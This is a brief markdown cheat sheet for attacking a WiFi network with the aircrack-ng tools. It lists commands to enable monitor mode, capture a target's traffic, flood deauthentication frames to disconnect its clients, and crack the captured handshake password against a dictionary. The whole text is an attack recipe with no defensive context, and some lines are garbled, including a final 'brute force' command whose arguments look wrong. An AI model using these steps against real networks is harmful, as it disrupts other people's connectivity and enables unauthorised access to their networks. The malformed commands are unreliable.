## Wifi DoS Attack

1. Put your wireless network interface into monitor mode:
	`airmon-ng start <ifname>`
1. Find out to WiFi connections:
	`airodump-ng <monifname>`
1. Monitor only the BSSID target:
	`airodump-ng [-w <packets>] -c <channel> -d <bssid> <monifname>`
1. Run a DoS attack:
	`aireplay-ng -00 -a <bssid> <monifname>`
1. _Stop the DoS attack_
1. Broken the password:
	`aircrack-ng [-a2] -w <dictionary> <packets>-<xy>.cap`

- Brute force (?):
	`aircrack-ng [-a2] -w <packets>-<xy>.cap -b <bssid> <monifname>`
